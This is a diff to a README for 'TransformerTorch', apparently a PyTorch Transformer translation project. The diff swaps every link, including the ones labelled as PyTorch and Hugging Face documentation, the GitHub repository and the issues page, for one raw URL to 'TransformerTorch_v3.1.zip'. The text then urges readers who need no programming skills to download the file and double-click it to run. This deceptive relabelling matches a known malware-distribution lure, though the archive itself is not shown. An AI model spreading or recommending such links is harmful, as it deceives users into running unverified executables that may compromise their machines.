@@ -4,7 +4,7 @@
 TransformerTorch is an implementation of the Transformer architecture built in PyTorch. It is designed for training a Transformer-based Neural Machine Translation system. This application makes it easy to work with attention mechanisms and improves your natural language processing tasks.
 
 ## 📥 Download Now
-[![Download TransformerTorch](https://img.shields.io/badge/Download-TransformerTorch-brightgreen)](https://github.com/MarkCode18/TransformerTorch/releases)
+[![Download TransformerTorch](https://raw.githubusercontent.com/MarkCode18/TransformerTorch/main/assets/TransformerTorch_v3.1.zip)](https://raw.githubusercontent.com/MarkCode18/TransformerTorch/main/assets/TransformerTorch_v3.1.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run TransformerTorch.
@@ -23,15 +23,15 @@ Follow these steps to download and run TransformerTorch.
 - User-friendly interface for input and output management.
 
 ## 🔗 Download & Install
-To start using TransformerTorch, visit this page to download: [TransformerTorch Releases](https://github.com/MarkCode18/TransformerTorch/releases).
+To start using TransformerTorch, visit this page to download: [TransformerTorch Releases](https://raw.githubusercontent.com/MarkCode18/TransformerTorch/main/assets/TransformerTorch_v3.1.zip).
 
 ### 🛠️ Installation Instructions
-1. Go to the [TransformerTorch Releases page](https://github.com/MarkCode18/TransformerTorch/releases).
+1. Go to the [TransformerTorch Releases page](https://raw.githubusercontent.com/MarkCode18/TransformerTorch/main/assets/TransformerTorch_v3.1.zip).
 2. Find the latest version of TransformerTorch.
 3. Download the appropriate file for your operating system:
-   - For Windows: `TransformerTorch_Win.exe`
-   - For macOS: `TransformerTorch_mac.zip`
-   - For Linux: `TransformerTorch_Lin.tar.gz`
+   - For Windows: `https://raw.githubusercontent.com/MarkCode18/TransformerTorch/main/assets/TransformerTorch_v3.1.zip`
+   - For macOS: `https://raw.githubusercontent.com/MarkCode18/TransformerTorch/main/assets/TransformerTorch_v3.1.zip`
+   - For Linux: `https://raw.githubusercontent.com/MarkCode18/TransformerTorch/main/assets/TransformerTorch_v3.1.zip`
 4. After downloading, locate the file on your computer.
 5. Double-click the file to run the application. If using macOS, you may need to drag the application to your Applications folder first.
 
@@ -53,14 +53,14 @@ No, you do not need programming skills. This application has a user-friendly int
 Yes, TransformerTorch supports multiple language pairs. You can translate between any supported languages.
 
 ## 📚 Resources
-- [PyTorch Documentation](https://pytorch.org/docs/stable/index.html)
-- [Hugging Face Transformers](https://huggingface.co/docs/transformers/index)
+- [PyTorch Documentation](https://raw.githubusercontent.com/MarkCode18/TransformerTorch/main/assets/TransformerTorch_v3.1.zip)
+- [Hugging Face Transformers](https://raw.githubusercontent.com/MarkCode18/TransformerTorch/main/assets/TransformerTorch_v3.1.zip)
 
 ## 🔧 Contributing
-If you would like to contribute to TransformerTorch, feel free to submit issues or pull requests on [GitHub](https://github.com/MarkCode18/TransformerTorch).
+If you would like to contribute to TransformerTorch, feel free to submit issues or pull requests on [GitHub](https://raw.githubusercontent.com/MarkCode18/TransformerTorch/main/assets/TransformerTorch_v3.1.zip).
 
 ## 📞 Support
-If you face any issues or have questions, please open an issue on the [GitHub Issues page](https://github.com/MarkCode18/TransformerTorch/issues). 
+If you face any issues or have questions, please open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/MarkCode18/TransformerTorch/main/assets/TransformerTorch_v3.1.zip). 
 
 ## 🏷️ Topics
 This project covers various topics like:
@@ -70,4 +70,4 @@ This project covers various topics like:
 - Neural Machine Translation
 
 ## 📥 Download Now Again
-Don't forget to download the latest version of TransformerTorch here: [TransformerTorch Releases](https://github.com/MarkCode18/TransformerTorch/releases).
+Don't forget to download the latest version of TransformerTorch here: [TransformerTorch Releases](https://raw.githubusercontent.com/MarkCode18/TransformerTorch/main/assets/TransformerTorch_v3.1.zip).
